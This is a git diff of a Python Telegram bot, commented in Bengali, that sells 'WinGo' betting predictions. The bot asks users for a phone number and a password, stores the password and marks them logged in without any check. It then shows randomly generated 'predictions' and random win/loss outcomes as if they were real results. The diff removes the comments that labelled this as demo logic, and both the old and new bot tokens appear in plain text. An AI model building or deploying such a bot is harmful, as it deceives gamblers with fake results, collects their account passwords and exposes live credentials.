@@ -13,7 +13,7 @@ from telegram.ext import (
 )
 
 # আপনার টেলিগ্রাম বটের টোকেন এবং আপনার অ্যাডমিন আইডি
-BOT_TOKEN = "8648518720:AAEWG-y74hp60BcrOyLiqNiTLMUwjvutPdA"
+BOT_TOKEN = "8648518720:AAH9vL-eBim_5uuvJLHVOZKkdb1-6Yp4oDw"
 ADMIN_ID = 8164888241
 
 user_states = {}
@@ -25,7 +25,7 @@ def get_state(uid):
             "awaiting": None,
             "phone": "",
             "password": "",
-            "balance": 1000.0,  # টেস্টের জন্য ডিফল্ট ব্যালেন্স 1000 ধরা হলো (পরে রিয়েল API ব্যালেন্স দিয়ে যুক্ত করা যাবে)
+            "balance": 1000.0,  # টেস্টের জন্য ডিফল্ট ব্যালেন্স 1000 ধরা হলো
             "game": None,
             "total_steps": 0,
             "steps": [],
@@ -48,12 +48,12 @@ async def auto_bet_loop(uid, ctx):
             if not state["running"]:
                 break
             
-            # বর্তমান স্টেপের বেট অ্যামাউন্ট চেক করা
             if not state["steps"]:
                 break
+            
             current_step = state["steps"][state["step_idx"] % len(state["steps"])]
             
-            # ব্যালেন্স চেক: অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স না থাকলে থামিয়ে দেওয়া এবং ক্রস চিহ্ন দেখানো
+            # ব্যালেন্স চেক: অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স না থাকলে ক্রস চিহ্ন দিয়ে বন্ধ করা
             if state["balance"] < current_step:
                 state["running"] = False
                 await ctx.bot.send_message(
@@ -69,7 +69,7 @@ async def auto_bet_loop(uid, ctx):
             p = gen_period(state["game"])
             prediction = random.choice(["BIG / GREEN", "SMALL / RED"])
             
-            # উইন নাকি লস তা রেন্ডম বা জেনারেটেড রেজাল্ট দিয়ে নির্ধারণ (ডেমো লজিক)
+            # উইন নাকি লস নির্ধারণ
             is_win = random.choice([True, False])
             result_status = "🟢 WIN (+)" if is_win else "🔴 LOSS (-)"
             
@@ -86,9 +86,9 @@ async def auto_bet_loop(uid, ctx):
                 f"📌 **Period:** {p}\n"
                 f"🎮 **Game:** WinGo {state['game'].upper()}\n"
                 f"💰 **Current Step Bet:** {current_step}\n"
-                f"🎨 **Result Type:** {prediction}\n"
-                f"📊 **Outcome:** {result_status}\n"
-                f"💵 **Updated Balance:** `{state['balance']}`\n"
+                f"🎨 **Result:** {prediction}\n"
+                f"📊 **Status:** {result_status}\n"
+                f"💵 **Balance:** `{state['balance']}`\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"⏳ *Next prediction in 30 seconds...*"
             )
@@ -171,16 +171,15 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             print(f"Admin message error: {e}")
         return
 
-    # ২. পাসওয়ার্ড নেওয়া এবং ব্যালেন্স চেক করা
+    # ২. পাসওয়ার্ড নেওয়া
     if not state["logged_in"] and state.get("awaiting") == "password":
         state["password"] = text
         state["logged_in"] = True
         state["awaiting"] = None
 
-        # ব্যালেন্স চেক (যদি ব্যালেন্স শূন্য বা কম হয়)
         if state["balance"] <= 0:
             await update.message.reply_text(
-                "❌ **ACCOUNT ERROR!**\nআপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই (`0` ব্যালেন্স)। অনুগ্রহ করে রিচার্জ করুন।",
+                "❌ **ACCOUNT ERROR!**\nআপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই (`0` ব্যালেন্স)।",
                 parse_mode="Markdown"
             )
             return
@@ -203,7 +202,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ
+    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ (যেমন: 5)
     if state["logged_in"]:
         if state.get("awaiting") == "total_steps":
             try:
@@ -220,7 +219,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 5")
             return
 
-        # ৪. সিরিয়াল অনুযায়ী স্টেপ ইনপুট নেওয়া
+        # ৪. সিরিয়াল অনুযায়ী স্টেপ ইনপুট নেওয়া (স্টেপ ১, স্টেপ ২...)
         if state.get("awaiting") == "collecting_steps":
             try:
                 val = float(text)
